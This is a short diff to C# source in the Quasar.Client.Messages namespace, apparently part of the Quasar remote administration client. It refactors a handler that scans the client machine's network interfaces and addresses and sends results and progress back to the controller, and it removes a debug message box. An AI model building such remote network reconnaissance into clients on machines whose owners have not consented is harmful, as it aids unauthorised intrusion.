@@ -60,15 +60,14 @@ namespace Quasar.Client.Messages
             Task.Run(() =>
             {
                 ScannerHelper.ScanInterfaceAction(message.nic,
-                (addressEntity, nicEntity) =>
+                (packet) =>
                 {
-                    client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
-                    MessageBox.Show($"Added new network entity: {addressEntity.Address}");
+                    client.Send(packet);
                 },
-                (totalInterfaces, targetInterfaceIndex, totalIps, remainingIps) =>
+                (packet) =>
                 {
                     //Dont forget, targetInterfaceIndex is actually targetInterfaceIndex + 1
-                    client.Send(new DoNetworkScanProgress { NetworkInterfaces = totalInterfaces, InterfaceIndex = targetInterfaceIndex, Addresses = totalIps, CurrentAddress = remainingIps });
+                    client.Send(packet);
                 });
                 client.Send(new DoNetworkScanProgress { Addresses = 0 }); // Complete
             });
